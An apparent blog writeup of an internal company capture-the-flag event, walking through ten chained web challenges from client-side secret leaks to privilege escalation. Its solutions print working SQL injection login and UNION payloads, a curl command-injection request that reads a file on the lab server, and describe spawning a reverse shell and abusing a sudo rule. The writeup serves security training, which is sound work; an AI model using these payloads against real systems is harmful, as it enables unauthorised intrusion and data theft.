---
title: "Writeup: Omegapoint Norway's Cybersecurity Awareness CTF 2023"
description: "During the Cybersecurity Awareness Month 2023, I was handed the awesome responsibility of organizing Omegapoint Norway’s very first internal security Capture The Flag (CTF) competition, extending the invitation not only to our Norwegian employees but also to our colleagues in Sweden..."
pubDate: "Jan 15 2024"
heroImage: "/banner/blog-placeholder-4.jpg"
draft: false
tags:
  - "writeup"
  - "omegapoint"
  - "beginner"
  - "2023"
---

During the Cybersecurity Awareness Month 2023, I was handed the awesome responsibility of organizing Omegapoint Norway’s very first internal security Capture The Flag (CTF) competition, extending the invitation not only to our Norwegian employees but also to our colleagues in Sweden.

Putting together a security competition like this took a lot of planning, but it was worth every bit of effort. Setting up the challenges, managing the infrastructure, and making sure the competition ran smoothly taught me a lot. It was a great learning experience for both myself and all involved. I believe that this event served as an engaging learning platform, offering participants a gamified pathway to delve deeper into security. The challenges covered real-world security topics, making it a fun and educational experience for all participants.

Spanning a duration of two months, over 40 employees joined in and participated, taking on a series of 13 challenges worth a total of 1300 points as the maximum total score. Tailored specifically for Omegapoint’s pentesters and developers, the challenges primarily focused on typical developer mistakes as well as the various aspects of web application security.

![list over the scenario-based challenges](https://hackmd.io/_uploads/r1SC9AqdT.png)

Seeing so many Omegapoint colleagues get involved and engaged with the challenges made it all worthwhile. It was amazing to see everyone learning and having a great time solving challenges related to security. In this writeup, I'd like to give a summary on the scenario-based challenges along with their respective solutions.

![The final scoreboard](https://hackmd.io/_uploads/Bk-Hs0qua.png)

![Statistics: total solve count by challenges](https://hackmd.io/_uploads/HyuvjC5up.png)

![Statistics: solve percentages per challenge](https://hackmd.io/_uploads/ByJ_oCc_6.png)

## [0] The Beginning

### Description

> Omegapoint is gearing up for Cybersecurity Awareness Month, and the management team has hidden secret cybersecurity manuals for the worthy employees. Explore the newly developed note-taking application at `xxx:yyy` to find the hidden treasures and embark on your cybersecurity journey!
>
> NOTE: use the user `guest:guest` if you want to test the application out! The note dashboard are currently only available for admin users.

### Solution

To begin with, the scenario-based challenges in this CTF are a set of 10 interconnected challenges based on the same scenario, and is made in such way that the participants has to pivot and get foothold on multiple hosts in the same network. In this case, the participants are supposed to take the role as a pentester aiming to get a foothold on an internal note-taking application. One does not necessarily have to solve all the challenges in the intended order.

The first challenge serves as an introduction, presenting participants with a URL directing them to the aforementioned note-taking application, along with guest credentials: `guest:guest`. This initial challenge is designed for exploration, requiring participants to navigate to the site and engage with it. The flag, representing successful completion of the challenge, is found in the "about" page, accompanied by a brief overview on the concept of Capture the Flag.

![the initial homepage](https://hackmd.io/_uploads/Bkerp69_6.png)

### Flag

`OMEGAPOINT{83f05caf1127df716c253fc340fe87d3}`

## [1] Never trust the Client

### Description

> How does one truly embark on the hunt for hidden secrets within a supposedly sourceless web application? But wait, is a client-side web application truly sourceless?

### Solution

Figuring out the underlying technlogies and frameworks used in a website is not only useful for a pentester working in a black-box environment, but it can also be useful for developers if they ever intend to take parts of the page as inspiration for their own work. A simple way of figuring this out can be done using the `devtools` which is a browser built-in tool one can use to help with the development of websites such as inspecting the DOM elements, checking the network traffics, memory profiling, etc...

Upon inspecting the source code through the `devtools`, it is revealed that this is a web application built with `Vite` (a build tool that handles things such as the build and bundle of the source code), coupled with client-side `React` (a js framework that eases web application development). Given its nature as a client-side web application, the whole source code is therefore provided directly to the user so that the page can be rendered by the user’s browser. Consequently, everything developed by the developer is accessible to the users. Although the bundled source code slightly differs from the original, thanks to obfuscation through code minification and bundling of various libraries, relying solely on obfuscation for security isn’t foolproof. Secrets such as API tokens or environment variables that is not supposed to be available for the client user should therefore not be included in such applications.

Digging into the source code while searching for the flag format `OMEGAPOINT{` unveils the flag. This flag operates as a token within an endpoint transmitted to the backend API for retrieving notes, as shown in the following code snippet:

```js
const Yy = {
    URL: "/api",
  },
  QC = async () =>
    await (
      await fetch(
        `${Yy.URL}/notes?token=OMEGAPOINT{7c0e12caf742bf36e604250fa8cc70fd}`,
        {
          headers: {
            Authorization: `Bearer ${Pg()}`,
          },
        },
      )
    ).json();
```

This identification of the flag’s presence underscores the importance of securing sensitive data within client-side applications, reinforcing the notion that certain information, like important API tokens, shouldn’t be exposed within such contexts.

### Flag

`OMEGAPOINT{7c0e12caf742bf36e604250fa8cc70fd}`

## [2] What's the deal with Dashboards?

### Description

> You get a dashboard, and you get a dashboard. Everyone gets a dashboard! Are you able to find the hidden dashboard and discover what's shown within it?

### Solution

Understanding that the web application relies on React on the client-side, it's logical to expect that the bundled code at the top section contains the libraries and the original developer-written code at the bottom. Armed with this insight, one can easily figure out the application logic. A thorough examination of this section unveils the various endpoints accessible within this Single Page Application (SPA). Among these, the path `/yet_another_dashboard_nice` distinctly stands out from all the endpoints:

```js
const nk = zx([
  {
    path: "/",
    element: M.jsx(YC, {}),
  },
  {
    path: "/login",
    element: M.jsx(qC, {}),
  },
  {
    path: "/logout",
    element: M.jsx(tk, {}),
  },
  {
    path: "/about",
    element: M.jsx(ek, {}),
  },
  {
    path: "/dashboard",
    element: M.jsx(XC, {}),
  },
  {
    path: "/yet_another_dashboard_nice",
    element: M.jsx(ZC, {}),
  },
]);
ml.createRoot(document.getElementById("root")).render(
  M.jsxs(b.StrictMode, {
    children: [
      M.jsx(Mx, {
        router: nk,
      }),
      M.jsx(sw, {}),
    ],
  }),
);
```

Upon navigating to this endpoint, an unexpected redirect occurs, leading back to the homepage. Reviewing the source code indicates that the React component associated with this endpoint is denoted as `ZC()`. A closer inspection of its code structure shows that it is simply a page containing some text and an image, forming a basic page layout.

The redirect issue seems to stem from the execution of an useEffect-hook during the initial rendering phase:

```js
function ZC() {
  const e = yi();
  return (
    R.useEffect(() => {
      e("/");
    }, [e]),
    M.jsxs(M.Fragment, {
      children: [
        M.jsx(to, {}),
        M.jsxs("main", {
          className: "px-4 max-w-[1080px] mx-auto",
          children: [
            M.jsx("h1", {
              className: "text-2xl font-bold pb-6",
              children: "Just a dashboard",
            }),
            M.jsx("p", {
              className: "pb-4 text-sm",
              children: "Here's another dashboard for you!",
            }),
            M.jsx("img", {
              src: "/dashboard_image.png",
              alt: "simply an image",
            }),
          ],
        }),
        M.jsx(ro, {}),
        M.jsx(no, {}),
      ],
    })
  );
}
```

Utilizing Chrome's capability for live file edits presents a simple workaround. By simply patching out the triggering of the `useEffect` function, one can bypass the redirect and directly access the endpoint housing the flag. Alternatively, one could also access the image directly by navigating to the `/dashboard_image.png` endpoint.

![the dashboard containing an image of the flag](https://hackmd.io/_uploads/r1Hvap9ua.png)

### Flag

`OMEGAPOINT{7774447bfebcb09e9528c9da49fd4ab3}`

## [3] Going Internal

### Description

> We love the .NET ecosystem and rewrote the whole web UI in an unarguably better framework! However, it's currently in preview, and we're not giving you the link to it.

### Solution

The challenge description hints at an existing .NET web application that is in preview. To uncover this link, one could figure out that the link to this page should be somehow found within the bundled source code. A thorough examination of the components used in various endpoints is, therefore, required. Doing so, we can find some suspiciously strange logic on an `onClick`-event handler attached to a button on the endpoint of `/dashboard`:

```js
const o = () => {
  window.location.hash.endsWith("???") &&
    (window.location.href = atob("L3ByZXZpZXctdjI="));
};
```

From the looks of it, navigating to the endpoint with a hash of `???`, thus`/dashboard#???`, redirects the user to some strange base64-encoded address. Decoding this address reveals it to be `/preview-v2`, leading to the discovery of an application built with .NET using the Blazor framework. The flag lies within the homepage of this Blazor application.

![preview of the web application](https://hackmd.io/_uploads/By-YTT5da.png)

### Flag

`OMEGAPOINT{ccb37d76162deb4461bc2ac3026ef71c}`

## [4] Admin rights for everybody!

### Description

> To unlock the dashboard's full potential, it appears you'll need admin privileges. Investigate the authentication mechanism at the login endpoint, which seems to involve SQL.

### Solution

Beyond the client-side functionality, certain endpoints were associated with a backend API, specifically, `/api/login` and `/api/notes`. An investigation into the login endpoint prompted exploration into potential vulnerabilities. Fuzzing the form fields with various characters, such as `'`, aimed to provoke errors that might inadvertently expose hidden or detailed messages.

> A helpful list for testing user-input data is [The Big List of Naughty Strings](https://github.com/minimaxir/big-list-of-naughty-strings). It's a collection of strings that often cause problems when used as input. For instance, the character `'` is one of those known for causing issues.

This probing, tracked through analysing the network traffic, triggers an error message that inadvertently discloses the SQL query used in the backend. Evidently, the developers failed to implement parameterized queries, exposing the following SQL injection flaw:

```json
{
  "status": "error",
  "error": {
    "name": "SqlError",
    "sqlMessage": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'a'' at line 1",
    "sql": "SELECT id, username, isAdmin FROM users WHERE username='a'' AND password='a'; - parameters:[]",
    "fatal": false,
    "errno": 1064,
    "sqlState": "42000",
    "code": "ER_PARSE_ERROR"
  }
}
```

With this, one can essentially access the entire database, including all notes and users. As the challenge involves obtaining admin privileges on the site, gaining access to an admin user is necessary. Through SQL injection, one can navigate through the users by using SQL clauses like `LIMIT` and `OFFSET`.

Setting the subsequent payload as the username grants access to a user with the flag as their username. Further adjustment by an offset of 2 unveils access to the admin user:

```sql
' OR 1=1 LIMIT 1 OFFSET 1 -- - User with flag
```

```sql
' OR 1=1 LIMIT 1 OFFSET 2 -- - Admin user
```

![logged in as a user with the flag as the username](https://hackmd.io/_uploads/HyxsTpqOT.png)

### Flag

`OMEGAPOINT{50e1ad3bbd85c57c528f06f84dafd174}`

## [5] The Dreaded Lost Library

### Description

> The reliance on libraries has inadvertently exposed hidden secrets of the web application. Can you find the exposed secret?

### Solution

Moving to the preview web application built with the Blazor framework, one can see that most of the functionality is similar to the React application, being a client-side framework under WebAssembly in interpreted mode. Here, the .NET Mono runtime gets compiled into WebAssembly, loading and executing .NET assemblies through the runtime as DLL files. However, since the DLL files are built by the normal .NET compilation toolchain, and we know by the fact that C# compiles to bytecode alongside several metadatas before machine code, there's a possibility of retrieving the source code by decompilation due to the nature of C# as a programming language as of .NET 7.

Inspecting network traffic through devtools reveals numerous loaded DLL files, including `webapp2.dll`, likely containing the compiled assembly of the web application. Retrieving that said DLL file and using tools such as such as [dnSpy](https://github.com/dnSpy/dnSpy), [dotPeek](https://www.jetbrains.com/decompiler/) and [ILSpy](https://github.com/icsharpcode/ILSpy) one can decompile it to access the source code.

> The release of .NET 8 introduced the new WebCIL format as the default distribution format for .NET 8 Blazor wasm assemblies. As of the time of this writeup, it's worth noting that there's currently a gap in available decompilers as none support the WebCIL format. This transition in distribution format signifies advancements in .NET technology, yet simultaneously presents a challenge for reverse engineering or decompilation due to the lack of tools catering to this specific format.

Looking at the decompiled source code one can find the flag in the singleton `SharedStateService`:

```c#
public class SharedStateService
{
	public string Flag = "OMEGAPOINT{1da92dcfcbe4122b3e99cc25dc6d71d8}";

	[CompilerGenerated]
	private Action? m_OnStateChange;

	[field: CompilerGenerated]
	public string Token
	{
		[CompilerGenerated]
		get;
		[CompilerGenerated]
		set;
	} = "";


	[field: CompilerGenerated]
	public User? User
	{
		[CompilerGenerated]
		get;
		[CompilerGenerated]
		set;
	}

	[field: CompilerGenerated]
	public string CurrentPath
	{
		[CompilerGenerated]
		get;
		[CompilerGenerated]
		set;
	} = "/preview-v2";


	public event Action OnStateChange
	{
		[CompilerGenerated]
		add
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			Action val = this.m_OnStateChange;
			Action val2;
			do
			{
				val2 = val;
				Action val3 = (Action)System.Delegate.Combine((System.Delegate)(object)val2, (System.Delegate)(object)value);
				val = Interlocked.CompareExchange<Action>(ref this.m_OnStateChange, val3, val2);
			}
			while (val != val2);
		}
		[CompilerGenerated]
		remove
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			Action val = this.m_OnStateChange;
			Action val2;
			do
			{
				val2 = val;
				Action val3 = (Action)System.Delegate.Remove((System.Delegate)(object)val2, (System.Delegate)(object)value);
				val = Interlocked.CompareExchange<Action>(ref this.m_OnStateChange, val3, val2);
			}
			while (val != val2);
		}
	}

	public void SetToken(string token)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		if (token.Length > 0)
		{
			JwtSecurityTokenHandler val = new JwtSecurityTokenHandler();
			((TokenHandler)val).ReadToken(token);
			SecurityToken obj = ((TokenHandler)val).ReadToken(token);
			JwtSecurityToken val2 = (JwtSecurityToken)(object)((obj is JwtSecurityToken) ? obj : null);
			if (val2 != null)
			{
				try
				{
					int id = Convert.ToInt32(val2.Claims.First((Claim claim) => claim.Type == "id").Value);
					string value = val2.Claims.First((Claim claim) => claim.Type == "username").Value;
					bool isAdmin = Convert.ToBoolean(Convert.ToInt32(val2.Claims.First((Claim claim) => claim.Type == "isAdmin").Value));
					User = new User(id, value, isAdmin);
					Token = token;
				}
				catch
				{
				}
			}
		}
		else
		{
			User = null;
			Token = "";
		}
		NotifyStateChanged();
	}

	public void SetCurrentPath(string path)
	{
		CurrentPath = path;
		NotifyStateChanged();
	}

	private void NotifyStateChanged()
	{
		Action? onStateChange = this.OnStateChange;
		if (onStateChange != null)
		{
			onStateChange.Invoke();
		}
	}
}

```

### Flag

`OMEGAPOINT{1da92dcfcbe4122b3e99cc25dc6d71d8}`

## [6] Dumping the Barrel

### Description

> As you explore the web application, you may find a way to access notes. However, even with admin privileges, accessing the note comments seems to not be possible.

### Solution

From the previous findings, we know that the login endpoint enables the extraction of the entire database. Extracting the all values in the notes table, one can find the flag hidden as a comment on a note. Additionally, the decompiled source code from the DLL file revealed a filter parameter on the notes endpoint, vulnerable to SQL injection due to the lack of using parameterized queries as well. An illustrative payload showcasing the retrieval of comments from the notes table, including the flag, is demonstrated below:

```sh
curl -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJhZG1pbiIsImlzQWRtaW4iOjEsImlhdCI6MTcwMTE3MzQ4NiwiZXhwIjoxNzMyNzA5NDg2fQ.TFzllamMp0d7Rv9eIdRvvJHWr8-dk0h2iZSY1Z6nV5c' 'http://51.120.250.68/api/notes?token=OMEGAPOINT%7B7c0e12caf742bf36e604250fa8cc70fd%7D&filter=1=0%20UNION%20SELECT%201,2,comment%20FROM%20notes'
```

![sqli on the notes-endpoint containing the flag](https://hackmd.io/_uploads/r1eVAp9da.png)

### Flag

`OMEGAPOINT{d4fba280dd6162ca55bdcb26feb12f05}`

## [7] That's right, you can read!

### Description

> Certain debugging endpoints of the server have been exposed through the library. Can you exploit them to your advantage?

### Solution

Through the decompiled source code, we can also see a debug endpoint at `/api/debug/date?format=`:

```c#
[AsyncStateMachine(typeof(<DebugDate>d__7))]
public async System.Threading.Tasks.Task<string> DebugDate()
{
    //IL_0002: Unknown result type (might be due to invalid IL or missing references)
    //IL_0007: Unknown result type (might be due to invalid IL or missing references)
    HttpRequestMessage val = new HttpRequestMessage(HttpMethod.Get, "/api/debug/date?format=%2B%25A%2C%20%25d.%25b%20%25Y%20-%20%25H%3A%25M%3A%25S");
    ((HttpHeaders)val.Headers).Add("Authorization", "Bearer " + stateService.Token);
    HttpResponseMessage val2 = (await httpClient.SendAsync(val)) ?? throw new System.Exception();
    if (val2.IsSuccessStatusCode)
    {
        return ((await JsonSerializer.DeserializeAsync<DataResponse>(await val2.Content.ReadAsStreamAsync(), (JsonSerializerOptions)null, default(CancellationToken))) ?? throw new System.Exception("Failed to deserialize response.")).Data ?? throw new System.Exception();
    }
    return "";
}
```

From the information within the application's written notes, it becomes evident that the debug endpoints execute bash commands, and it seems that there is a command injection vulnerability in the format argument of the unix command `date`. Another way to discover this vulnerability involves probing the inputs within the endpoint and analysing the subsequent error messages. This underscores the significance of not exposing sensitive informations in error messages to prevent revealing potential security loopholes to users.

With sites such as [GTFOBins](https://gtfobins.github.io/) one could quickly figure out the possibility for arbitrary file reads (https://gtfobins.github.io/gtfobins/date/). Understanding that the backend is constructed with Express.js, exploring the file structure through `package.json` becomes feasible. Further inspection of the `index.js` file, housing the backend logic, unveils the flag being used as a token for another, more detailed debug endpoint.

![Local File Read on the debug-endpoint](https://hackmd.io/_uploads/B1SLRT5up.png)

### Flag

`OMEGAPOINT{d8b732c8a1d3e796be06bb8b8a172e7a}`

## [8] Take Control

### Description

> Knowing how to read is a good start, but can you also figure out how to access the server? It's necessary to figure out the parameters for the debugging endpoint.

### Solution

It appears that during the CTF, unintended solutions were found in this challenge due to the flag file's path being easily guessable. This allowed for one to directly read the file by deducing the system's user and file structure.

Addressing this, a potential solution involves making the flag file executable, mandating the need for Remote Code Execution (RCE) to access its content. Alternatively, introducing randomness or entropy into the file's name could enhance its unpredictability, making it less prone to straightforward guesses.

However, the intended and necessary solution to progress further to the next and final challenge requires achieving Remote Code Execution (RCE) within the system. The more detailed debug endpoint executes the Unix command `date` using `child_process.exec()` instead of `child_process.spawn()` in the last challenge, allowing for greater control over chaining multiple commands, thereby enabling for arbitrary RCE. For instance, appending a semicolon (`;`) followed by additional commands after executing date could serve as an example payload for achieving this RCE.

```sh
curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJhZG1pbiIsImlzQWRtaW4iOjEsImlhdCI6MTcwMTE3MzQ4NiwiZXhwIjoxNzMyNzA5NDg2fQ.TFzllamMp0d7Rv9eIdRvvJHWr8-dk0h2iZSY1Z6nV5c' -H 'X-DEBUG: OMEGAPOINT{d8b732c8a1d3e796be06bb8b8a172e7a}' 'http://51.120.250.68/api/debug/date?format=a;cat%20/home/user/flag.txt'
```

![remote code execution on the debug endpoint](https://hackmd.io/_uploads/r1RBkM2_a.png)

### Flag

`OMEGAPOINT{8fe9deb64640640925372079449bfcb5}`

## [9] I am groot!

### Description

> You're very close to the secret manuals now. Can you grow from a mere user to the mighty admin?

### Solution

Exploring the system reveals the presence of an `admin` user, which currently remains beyond our control. To gain more comprehensive access and foothold on the system, spawning a reverse shell would be advantageous as well as making things easier for us to control. Additionally, geting access to an interactive tty-shell, would open up for certain commands and actions that would otherwise be restricted.

> Sites such as [revshells](https://www.revshells.com/) can help in constructing payloads specifically designed to spawn a reverse shell on the target system.

![reverse shell](https://hackmd.io/_uploads/BJPuCp5_T.png)

With an interactive shell at our disposal, navigating and exploring the system becomes more convenient. Privilege Escalation, the next step, involves gaining higher-level permissions within a system or network. This phase is crucial as adversaries, despite having limited initial access, usually require elevated permissions to actually achieve their objectives. Common approaches are to take advantage of system weaknesses such as misconfigurations or exploiting vulnerabilities in running applications.

Tools like [LinPEAS](https://github.com/carlospolop/PEASS-ng) effectively identify misconfigurations, aiding in discovering paths to privilege escalation. In our case, one would discover a misconfiguration in the sudoers list, where the user `user` is granted the ability to execute the command `/usr/local/bin/node` as the `admin` user.

![listing the sudoers list](https://hackmd.io/_uploads/S1EdxCc_a.png)

Leveraging this configuration allows us to execute arbitrary JavaScript code via `Node`, which essentially means that we have an arbitrary Remote Code Execution (RCE) as shown below. Running commands as the admin user is the final step to gaining access to the system, signifying the completion of the scenario-based challenges.

![running commands as the admin user](https://hackmd.io/_uploads/Hkn_e0cO6.png)

### Flag

`OMEGAPOINT{df96d4cefdca2c0350017ec64ad20529}`
